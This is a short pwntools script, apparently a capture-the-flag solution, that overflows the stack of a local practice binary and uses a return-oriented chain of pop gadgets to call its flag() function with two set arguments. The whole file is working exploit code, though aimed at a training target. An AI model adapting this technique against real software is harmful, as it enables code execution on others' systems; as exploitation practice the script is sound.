#!/usr/bin/python3
from pwn import *

context.binary = ELF('./vuln-64')

p = process()

POP_RDI = 0x4011fb
POP_RSI_R15 = 0x4011f9

offset = 56
flag_addr = 0x40116f

payload = flat(
    b'A' * offset,
    POP_RDI,        # pop_rdi address
    0xdeadc0de,     # 1st param
    POP_RSI_R15,    # pop_rsi_r15 address
    0xc0ded00d,     # 2nd param
    0x0,            # r15 val (not important)
    flag_addr,      # flag() address
    0x0             # flag() return address
)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
